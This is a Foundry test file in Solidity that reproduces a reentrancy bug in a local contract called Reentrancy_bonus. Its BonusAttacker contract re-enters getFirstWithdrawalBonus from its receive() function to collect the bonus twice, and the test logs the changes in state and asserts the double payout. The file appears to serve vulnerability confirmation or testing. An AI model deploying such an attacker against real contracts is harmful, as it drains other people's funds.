// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public bonusContract;
    BonusAttacker public attacker;
    uint256 public constant TEST_DEPOSIT = 1 ether;

    function setUp() public {
        // Create contract and seed funds
        bonusContract = new Reentrancy_bonus();
        vm.deal(address(this), TEST_DEPOSIT);
        bonusContract.depositFunds{value: TEST_DEPOSIT}();

        // Deploy attacker contract
        attacker = new BonusAttacker(bonusContract);
        vm.deal(address(attacker), 0); // Clear any accidental balance
    }

    function testReentrancyExploit() public {
        uint256 initialContractBalance = address(bonusContract).balance;
        
        // Pre-attack state capture
        console2.log("--- BEFORE-Trigger State ---");
        uint256 preTotalRewards = bonusContract.totalRewardsDistributed();
        uint256 preAttackerRewards = bonusContract.userTotalRewards(address(attacker));
        uint256 preBonusClaims = bonusContract.totalBonusClaims();
        console2.log("Pre-attack rewards distributed: %s", preTotalRewards);
        console2.log("Pre-attack attacker rewards: %s", preAttackerRewards);
        console2.log("Pre-attack bonus claims: %s", preBonusClaims);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        // Post-attack state capture
        console2.log("--- AFTER-Trigger State ---");
        uint256 postTotalRewards = bonusContract.totalRewardsDistributed();
        uint256 postAttackerRewards = bonusContract.userTotalRewards(address(attacker));
        uint256 postBonusClaims = bonusContract.totalBonusClaims();
        console2.log("Post-attack rewards distributed: %s", postTotalRewards);
        console2.log("Post-attack attacker rewards: %s", postAttackerRewards);
        console2.log("Post-attack bonus claims: %s", postBonusClaims);

        // Differential analysis
        console2.log("--- Differential Analysis ---");
        uint256 rewardsDiff = postTotalRewards - preTotalRewards;
        uint256 attackerRewardsDiff = postAttackerRewards - preAttackerRewards;
        uint256 claimsDiff = postBonusClaims - preBonusClaims;
        console2.log("Reward distribution delta: %s (expected 200)", rewardsDiff);
        console2.log("Attacker rewards delta: %s (expected 200)", attackerRewardsDiff);
        console2.log("Bonus claims delta: %s (expected 2)", claimsDiff);

        // Final vulnerability verdict
        bool anomalyDetected = (rewardsDiff == 200) && 
                               (attackerRewardsDiff == 200) && 
                               (claimsDiff == 2);
        
        if (anomalyDetected) {
            console2.log("Vulnerability Exists: State changes confirm reentrancy led to double bonus payout");
        } else {
            console2.log("Vulnerability not Exist: State changes not match reentrancy pattern");
        }

        // Original balance verifications remain unchanged
        assertEq(address(attacker).balance, 200 wei, "Attacker should receive double bonus");
        assertEq(
            address(bonusContract).balance, 
            initialContractBalance - 200 wei, 
            "Contract should lose double bonus"
        );
    }
}

contract BonusAttacker {
    Reentrancy_bonus public target;
    bool private reentrancyGuard;

    constructor(Reentrancy_bonus _target) {
        target = _target;
    }

    // Entry point for attack
    function attack() external {
        // Initial claim starts exploit
        target.getFirstWithdrawalBonus(address(this));
    }

    // Reentrancy happens during ETH transfer
    receive() external payable {
        if (!reentrancyGuard) {
            reentrancyGuard = true;
            // Reentrant bonus claim during first withdrawal
            target.getFirstWithdrawalBonus(address(this));
        }
    }
}